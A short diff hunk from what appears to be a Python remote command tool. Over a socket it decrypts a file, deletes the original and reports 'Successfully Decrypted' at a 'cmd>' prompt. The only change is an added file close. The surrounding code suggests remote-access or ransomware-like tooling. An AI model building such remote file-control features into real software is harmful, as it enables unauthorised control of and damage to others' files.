@@ -150,6 +150,7 @@ cmd> """.format(pyver,pycompiler,pybuild,pybranch)
                         n = open(new_nm0, 'wb')
                         n.write(decry)
                         os.remove(arq)
+                        n.close()
 
                         godmes = "Successfully Decrypted\ncmd> "
                         s.send(godmes.encode())
